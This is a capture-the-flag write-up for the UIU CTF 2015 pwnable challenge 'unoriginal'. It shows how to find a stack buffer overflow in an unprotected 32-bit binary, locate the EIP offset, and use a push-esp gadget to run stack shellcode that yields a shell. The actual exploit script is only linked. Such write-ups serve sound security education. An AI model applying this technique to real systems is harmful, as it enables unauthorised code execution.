# UIU CTF 2015: unoriginal

**Category:** Pwnable
**Points:** 100
**Solves:** 22
**Description:** 

> PWN: Ah, but this challenge at unoriginal.uiuc.sexy port 1235 is so [unoriginal](unoriginal) :( .

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://gist.github.com/emyei/5f60c733761573b760d2>

### Meta

* Stack Buffer Overflow `sbo`, `jump to register`

We are given a i386 32bit non-stripped ELF for Linux:

```bash
$ file unoriginal 
unoriginal: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=05553bc7eda7c492d2a2fead35eccc12d746fff7, not stripped
```

Running it:

```bash
$ ./unoriginal 
Hack the Planet!
hello?
```

We can provide input after the initial banner `Hack the Planet!`.

`checksec`:

```bash
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
```

Everything is turned off - so we can e.g. provide shellcode to the stack to be executed! Good news (for us)!

Let's try to provide some more input and check for a Stack Buffer Overflow:

```bash
$ p -c 'print "A"*0x500' | ./unoriginal 
Hack the Planet!
Segmentation fault (core dumped)
```

Bingo! Let's have a closer look with `ltrace`:

```bash
$ p -c 'print "A"*0x500' | ltrace -s 256 -f ./unoriginal 2> /tmp/out
Hack the Planet!
$ cat /tmp/out 
[pid 2387] __libc_start_main(0x8048449, 1, 0xffc026a4, 0x8048480 <unfinished ...>
[pid 2387] puts("Hack the Planet!")                                                                                                                                                                                           = 17
[pid 2387] read(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
[pid 2387] --- SIGSEGV (Segmentation fault) ---
[pid 2387] +++ killed by SIGSEGV +++
```

Ok looks like the binary reads `256` bytes from our input with `read`.

Let's create a pattern with size `256` with `gdb-peda`:

```bash
gdb-peda$ pattern_create 256
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b'
```

And provide it to the binary while executing it with `strace`:

```bash
$ echo -n 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b' | strace -s 256 -f ./unoriginal 2>/tmp/out 
Hack the Planet!
Segmentation fault (core dumped)
$ cat /tmp/out 
execve("./unoriginal", ["./unoriginal"], [/* 32 vars */]) = 0
[ Process PID=2435 runs in 32 bit mode. ]
brk(0)                                  = 0x97de000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff77d7000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=117029, ...}) = 0
mmap2(NULL, 117029, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfffffffff77ba000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\300\233\1\0004\0\0\0\204\214\32\0\0\0\0\0004\0 \0\n\0(\0C\0B\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\264\207\26\0\264\207\26\0\264\207\26\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4H\32\0\4H\32\0\5\0\0\0\0\20\0\0\1\0\0\0\320Q\32\0\320Q\32\0\320Q\32\0\354,\0\0\254X\0\0\6\0\0\0\0\20\0\0\2\0\0\0\250m\32\0\250m\32\0\250m\32\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0D\0\0\0D\0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\320Q\32\0\320Q\32\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1742588, ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff77b9000
mmap2(NULL, 1747580, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xfffffffff760e000
mmap2(0xf77b3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a5000) = 0xfffffffff77b3000
mmap2(0xf77b6000, 10876, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfffffffff77b6000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff760d000
set_thread_area(0xff8e4b50)             = 0
mprotect(0xf77b3000, 8192, PROT_READ)   = 0
mprotect(0xf77f9000, 4096, PROT_READ)   = 0
munmap(0xf77ba000, 117029)              = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 4), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff77d6000
write(1, "Hack the Planet!\n", 17)      = 17
read(0, "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b", 256) = 256
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414341} ---
+++ killed by SIGSEGV (core dumped) +++
```

We can see in the second-last line in `si_addr` the overwritten RIP causing the Segmentation Fault, `0x41414341`.

Having the endianess in mind, we convert this address back to a string `ACAA` and look for the offset and thus the length needed to overwrite `EIP` using `gdb-peda`'s `pattern_offset`:

```bash
gdb-peda$ pattern_offset ACAA
ACAA found at offset: 17
```

So we have to provide `17` bytes to overwrite `EIP`.

Testing it again:

```bash
$ p -c 'import sys; sys.stdout.write("A"*17+"BBBB")'                                                                                                                                                                                                                                                                                                                 
AAAAAAAAAAAAAAAAABBBB$ p -c 'import sys; sys.stdout.write("A"*17+"BBBB")' | strace -s 256 -f ./unoriginal 
execve("./unoriginal", ["./unoriginal"], [/* 32 vars */]) = 0
[...]
read(0, "AAAAAAAAAAAAAAAAABBBB", 256)   = 21
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```

`si_addr` is indeed `0x42424242` == `BBBB`.

We can control `EIP` now. However, we need to redirect `EIP` to a valid, executable stack address, which we can't leak.

So that means we have to redirect `EIP` to static addresses in the binary (starting with `0804....`), which leaves us with the option `ROP`.

Our goal, as in [this challenge](https://github.com/ctfs/write-ups-2015/blob/f8e2f4b7159b774e694357dba83559687a46ffb0/nullcon-hackim-2015/exploit-1/README.md) is to find a gadget allowing us to either let `EIP` jump to the current stack position without having to provide any valid stack address.

[This writeup](https://gist.github.com/emyei/5f60c733761573b760d2) found a `push esp; nop; <...>; nop; mov ebx, [esp]; ret` gadget, which leads to this solution:

* Overwrite `EIP` with the address of the gadget, `0x8048350`
* Right after that, provide our shellcode
* After a `ret` from the current function calling `read` is executed, `EIP` will jump to the gadget, executing it
* `esp`, in the meantime, will point to our shellcode
* The gadget essentially pushes the current stack pointer `esp` address to the stack
* After a unnecessary `mov ebx, [esp]`, `ret` is executed, forcing `EIP` to jump to whatever `esp` is currently pointing to
* Our shellcode is thus executed, providing us with a shell!

[This python script](./solve.py) does the job:

```bash
K$ p solve.py 
[+] Started program './unoriginal'
[*] Switching to interactive mode
$ ls f*
flag.txt
$ cat flag.txt
flag{actually_the_flag_is_unknown}
$ ^D
[*] Stopped program './unoriginal'
```

PS: TODO or FIX is that it doesn't work remotely.

## Other write-ups and resources

* <https://gist.github.com/emyei/5f60c733761573b760d2>
* <http://pastebin.com/UZrf2RJ5>